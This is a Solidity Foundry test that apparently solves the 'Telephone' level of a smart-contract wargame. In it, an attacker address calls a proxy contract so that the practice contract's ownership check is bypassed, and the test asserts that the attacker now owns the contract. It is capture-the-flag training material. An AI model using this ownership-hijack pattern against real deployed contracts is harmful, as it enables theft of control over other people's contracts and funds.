// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "tests/Test.sol";
import "../../src/Telephone/Level.sol";
import "forge-std/console.sol";
import "../utils/TelProxy.sol";

interface ITelephone {
    function changeOwner(address) external;

    function owner() external view returns(address);
}

interface ITelProxy {
    function makeACall(address telephone, address owner) external;
}

contract FalloutTest is Test {
    ITelephone telephone;
    ITelProxy telProxy;

    address deployer = address(100);
    address attacker = address(101);

    function setUp() public {
        vm.prank(deployer); // deploy the contract as deployer
        telephone = ITelephone(address(new Telephone()));
        telProxy = ITelProxy(address(new TelProxy()));
    }

    function testAttack() public {
        /* Setup stuff, no need to touch */
        vm.startPrank(attacker);
        vm.deal(attacker, 5 ether);

        /* Write your code here */
        telProxy.makeACall(address(telephone), attacker);
        /* Write your code here */ 

        /* Validating the test */
        assertEq(telephone.owner(), attacker);
    }
}

